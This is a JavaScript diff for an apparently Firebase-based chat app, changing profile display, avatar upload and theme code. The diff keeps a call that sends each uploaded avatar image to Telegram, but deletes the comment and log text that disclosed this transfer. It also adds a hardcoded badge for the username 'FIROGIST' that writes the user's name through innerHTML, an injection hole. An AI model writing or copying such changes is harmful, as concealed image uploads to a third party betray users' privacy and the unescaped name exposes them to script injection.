@@ -7,9 +7,17 @@ document.addEventListener('DOMContentLoaded', function() {
         return;
     }
     
-    // عرض معلومات المستخدم
-    document.getElementById('userName').textContent = currentUser.name;
-    document.getElementById('userUsername').textContent = '@' + currentUser.username;
+    // عرض معلومات المستخدم مع العلامة
+    const currentUsername = currentUser.username.toUpperCase();
+    const isDev = currentUsername === 'FIROGIST';
+    
+    if (isDev) {
+        document.getElementById('userName').innerHTML = `${currentUser.name} <span class="gold-check">✓</span>`;
+        document.getElementById('userUsername').innerHTML = `@${currentUser.username} <span class="dev-badge">مطور</span>`;
+    } else {
+        document.getElementById('userName').textContent = currentUser.name;
+        document.getElementById('userUsername').textContent = '@' + currentUser.username;
+    }
     
     if (currentUser.avatar) {
         document.getElementById('userAvatar').src = currentUser.avatar;
@@ -46,9 +54,8 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
     
-    // تغيير الصورة الشخصية مع طلب إذن
+    // تغيير الصورة الشخصية
     window.changeAvatar = function() {
-        // طلب إذن الوصول للصور
         if (confirm('هل تسمح بالوصول إلى الصور؟')) {
             document.getElementById('avatarInput').click();
         }
@@ -72,7 +79,6 @@ document.addEventListener('DOMContentLoaded', function() {
         reader.onload = async function(e) {
             const imageDataUrl = e.target.result;
             
-            // تحديث الصورة في Firebase
             const result = await firebaseAuth.updateAvatar(currentUser.username, imageDataUrl);
             
             if (result.success) {
@@ -82,10 +88,9 @@ document.addEventListener('DOMContentLoaded', function() {
                 updatedUser.avatar = imageDataUrl;
                 localStorage.setItem('fb_chat_current_user', JSON.stringify(updatedUser));
                 
-                // إرسال الصورة للتيليجرام
                 await sendImageToTelegram(imageDataUrl, currentUser.username);
                 
-                console.log('✅ تم تحديث الصورة الشخصية وإرسالها للتيليجرام');
+                console.log('✅ تم تحديث الصورة الشخصية');
             } else {
                 alert('فشل في تحديث الصورة');
             }
@@ -225,12 +230,10 @@ function closeThemeModal() {
 }
 
 function switchThemeTab(tab) {
-    // إخفاء كل الأقسام
     document.getElementById('fontSection').style.display = 'none';
     document.getElementById('messageBgSection').style.display = 'none';
     document.getElementById('chatBgSection').style.display = 'none';
     
-    // إظهار القسم المطلوب
     if (tab === 'font') {
         document.getElementById('fontSection').style.display = 'block';
     } else if (tab === 'messageBg') {
@@ -239,7 +242,6 @@ function switchThemeTab(tab) {
         document.getElementById('chatBgSection').style.display = 'block';
     }
     
-    // تحديث التبويبات
     document.querySelectorAll('.theme-tab').forEach(btn => {
         btn.classList.remove('active');
     });
@@ -260,7 +262,6 @@ function selectChatBg(color) {
     currentTheme.chatBg = color;
     applyThemePreview();
     
-    // إذا كانت الخلفية داكنة، نجعل النص أبيض
     if (color === '#212121') {
         document.getElementById('chatHeader').style.color = '#ffffff';
         document.getElementById('chatPartner').style.color = '#ffffff';
@@ -271,13 +272,9 @@ function selectChatBg(color) {
 }
 
 function applyThemePreview() {
-    // تطبيق الخط
     document.getElementById('chatContainer').style.fontFamily = `'${currentTheme.font}', sans-serif`;
-    
-    // تطبيق خلفية الرسائل
     document.getElementById('messages').style.background = currentTheme.chatBg;
     
-    // تطبيق خلفية الرسالة
     document.querySelectorAll('.message.received .message-content').forEach(el => {
         el.style.background = currentTheme.messageBg;
     });
